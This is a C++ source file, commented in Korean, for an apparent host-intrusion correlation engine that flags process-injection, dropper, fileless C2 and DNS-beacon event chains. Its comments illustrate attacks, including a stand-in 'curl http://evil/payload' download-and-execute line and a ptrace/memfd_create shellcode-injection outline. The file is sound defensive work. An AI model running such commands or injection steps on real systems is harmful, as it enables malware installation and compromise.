/*
 * correlator.cpp - 이벤트 상관 분석 구현
 */
#include "correlation/correlator.h"

/* ── 내부 헬퍼 ─────────────────────────────────────────────────────────── */

void CorrelationEngine::evict(uint32_t pid, uint64_t now_ns)
{
    auto it = hist_.find(pid);
    if (it == hist_.end()) return;

    auto &dq = it->second;

    /* MAX_WINDOW_NS 초과 항목 앞에서부터 제거 */
    while (!dq.empty() && now_ns - dq.front().ts_ns > MAX_WINDOW_NS)
        dq.pop_front();

    /* 용량 초과 시 가장 오래된 항목 제거 */
    while (dq.size() >= MAX_RECORDS)
        dq.pop_front();
}

bool CorrelationEngine::seen(uint32_t pid, CorrelEvt kind,
                              uint64_t now_ns, uint64_t within_ns) const
{
    auto it = hist_.find(pid);
    if (it == hist_.end()) return false;

    for (const auto &r : it->second)
        if (r.kind == kind && now_ns - r.ts_ns <= within_ns)
            return true;

    return false;
}

/* ── 공개 인터페이스 ────────────────────────────────────────────────────── */

std::vector<RuleMatch> CorrelationEngine::feed(uint32_t pid,
                                                CorrelEvt kind,
                                                uint64_t  ts_ns)
{
    /* 1단계: 만료 항목 제거 */
    evict(pid, ts_ns);

    std::vector<RuleMatch> hits;

    /*
     * 2단계: 기존 히스토리에서 패턴 완성 여부 확인.
     * 새 이벤트를 아직 추가하지 않았으므로 자기 자신과의 매칭 없음.
     *
     * ────────────────────────────────────────────────────────────────────
     * R-019: ptrace ↔ memfd_create (30초 창)
     *
     * 공격 흐름:
     *   ptrace(PTRACE_ATTACH, victim)  → 대상 프로세스 정지
     *   memfd_create("", ...)          → 익명 메모리 파일 생성
     *   write(memfd, shellcode)        → 셸코드 기록
     *   (PTRACE_POKEDATA 로 memfd 주소를 victim 에 주입)
     *   ptrace(PTRACE_CONT)            → 실행 재개 → 셸코드 실행
     *
     * 두 이벤트 중 어느 쪽이 먼저 와도 탐지할 수 있도록 양방향 체크.
     * ────────────────────────────────────────────────────────────────────
     */
    if (kind == CorrelEvt::MEMFD  && seen(pid, CorrelEvt::PTRACE,   ts_ns, W30))
        hits.push_back({"R-019", "프로세스 인젝션 체인: ptrace + memfd_create", "critical"});
    if (kind == CorrelEvt::PTRACE && seen(pid, CorrelEvt::MEMFD,    ts_ns, W30))
        hits.push_back({"R-019", "프로세스 인젝션 체인: ptrace + memfd_create", "critical"});

    /*
     * R-020: /tmp 실행 ↔ 아웃바운드 연결 (60초 창)
     *
     * 드로퍼(downloader) 패턴:
     *   1) 메모리에서 바이너리를 /tmp 에 드롭
     *   2) /tmp/evil 실행  ← EXEC_TMP
     *   3) C2 서버로 연결  ← NET_CONN
     *
     * 또는 역순(reverse shell 먼저 연결 후 페이로드 다운로드 실행).
     */
    if (kind == CorrelEvt::NET_CONN  && seen(pid, CorrelEvt::EXEC_TMP, ts_ns, W60))
        hits.push_back({"R-020", "드로퍼 C2 체인: /tmp 실행 후 아웃바운드 연결", "critical"});
    if (kind == CorrelEvt::EXEC_TMP  && seen(pid, CorrelEvt::NET_CONN, ts_ns, W60))
        hits.push_back({"R-020", "드로퍼 C2 체인: 연결 후 /tmp 실행", "critical"});

    /*
     * R-021: /tmp 쓰기 → /tmp 실행 (60초 창, 단방향)
     *
     * 다운로드+실행 패턴:
     *   curl http://evil/payload -o /tmp/evil  → WRITE_TMP
     *   chmod +x /tmp/evil && /tmp/evil        → EXEC_TMP
     *
     * 반대 방향(실행 후 쓰기)도 고위험이므로 양방향 탐지.
     */
    if (kind == CorrelEvt::EXEC_TMP  && seen(pid, CorrelEvt::WRITE_TMP, ts_ns, W60))
        hits.push_back({"R-021", "다운로드+실행: /tmp 쓰기 후 실행", "critical"});
    if (kind == CorrelEvt::WRITE_TMP && seen(pid, CorrelEvt::EXEC_TMP,  ts_ns, W60))
        hits.push_back({"R-021", "다운로드+실행: /tmp 실행 후 추가 쓰기", "high"});

    /*
     * R-022: RWX 메모리 ↔ 아웃바운드 연결 (30초 창)
     *
     * 파일리스 C2 패턴:
     *   mmap(PROT_WRITE|PROT_EXEC) 또는 mprotect(RWX)  → MEM_RWX
     *   connect() 로 C2 서버에 reverse shell 연결        → NET_CONN
     *
     * 공격자가 JIT 런타임처럼 보이게 위장하는 경우 RWX 단독으로는
     * 신뢰도가 낮지만, C2 연결과 결합하면 거의 확실.
     */
    if (kind == CorrelEvt::NET_CONN && seen(pid, CorrelEvt::MEM_RWX, ts_ns, W30))
        hits.push_back({"R-022", "파일리스 C2: RWX 메모리 후 아웃바운드 연결", "critical"});
    if (kind == CorrelEvt::MEM_RWX  && seen(pid, CorrelEvt::NET_CONN, ts_ns, W30))
        hits.push_back({"R-022", "파일리스 C2: 연결 중 RWX 메모리 할당", "critical"});

    /*
     * R-023: 의심 DNS 조회 ↔ 아웃바운드 연결 (30초 창)
     *
     * C2 비콘 패턴:
     *   resolve(dga-domain.tk)    → DNS 응답으로 C2 IP 획득  → DNS_SUSP
     *   connect(c2_ip, port)      → C2 서버에 체크인          → NET_CONN
     *
     * DGA/DNS 터널링이 탐지된 직후 connect() 가 따라오면 C2 비콘 확정.
     */
    if (kind == CorrelEvt::NET_CONN  && seen(pid, CorrelEvt::DNS_SUSP, ts_ns, W30))
        hits.push_back({"R-023", "C2 비콘: 의심 DNS 조회 후 아웃바운드 연결", "high"});
    if (kind == CorrelEvt::DNS_SUSP  && seen(pid, CorrelEvt::NET_CONN, ts_ns, W30))
        hits.push_back({"R-023", "C2 비콘: 연결 중 의심 DNS 조회", "high"});

    /* 3단계: 새 이벤트 히스토리에 추가 */
    hist_[pid].push_back({kind, ts_ns});

    return hits;
}

void CorrelationEngine::remove(uint32_t pid)
{
    hist_.erase(pid);
}
